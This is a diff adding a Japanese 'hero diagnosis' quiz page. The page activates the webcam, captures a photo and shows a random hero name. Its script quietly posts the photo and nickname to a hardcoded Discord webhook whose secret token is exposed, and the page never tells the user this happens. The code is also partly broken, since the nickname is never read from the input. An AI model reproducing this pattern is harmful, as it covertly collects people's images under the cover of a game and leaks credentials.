@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ヒーロー診断</title>
+</head>
+<body>
+  <h1>ヒーロー診断</h1>
+  
+  <label for="nickname">ニックネーム:</label>
+  <input type="text" id="nickname" placeholder="ニックネームを入力">
+  <br>
+  
+  <button id="start-camera">カメラを起動</button>
+  <video id="video" width="300" height="200" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <br>
+  
+  <button id="capture">写真を撮る</button>
+  <br>
+  
+  <h2>診断結果:</h2>
+  <p id="hero-name"></p>
+  
+  <script>
+    const heroNames = ["アサルト", "ボマー", "ゴースト", "メディック", "エレキ", "シールド", "チュチュ", "アイアン", "リーコン", "キャット", "ランチャー"];
+    
+    const startCameraButton = document.getElementById("start-camera");
+    const captureButton = document.getElementById("capture");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const heroNameDisplay = document.getElementById("hero-name");
+    
+    let nickname = '';
+    
+    // カメラの起動
+    startCameraButton.addEventListener('click', async () => {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+    });
+    
+    // 写真を撮る
+    captureButton.addEventListener('click', () => {
+      // canvasに画像を描画
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // ランダムにヒーロー名を選ぶ
+      const hero = heroNames[Math.floor(Math.random() * heroNames.length)];
+      heroNameDisplay.innerText = `あなたのヒーロー: ${hero}`;
+      
+      // Webhook送信 (ここでは仮のコード、実際にはサーバー経由で送信)
+      sendToWebhook(nickname, hero, canvas.toDataURL());
+    });
+    
+    // Webhookに送信
+    function sendToWebhook(nickname, hero, imageData) {
+      const webhookURL = 'https://discord.com/api/webhooks/1365970673616551946/5fJaT3-myLxSwMpJnK4pCgPF91F970Krj3TCH5NA3C5RPGJPFJRKFCWWp_Fe5tyD6eLg';
+      const payload = {
+        content: `ニックネーム: ${nickname}\nヒーロー: ${hero}`,
+        embeds: [{
+          image: {
+            url: imageData
+          }
+        }]
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      })
+      .then(response => response.json())
+      .then(data => console.log('Success:', data))
+      .catch(error => console.error('Error:', error));
+    }
+  </script>
+</body>
+</html>
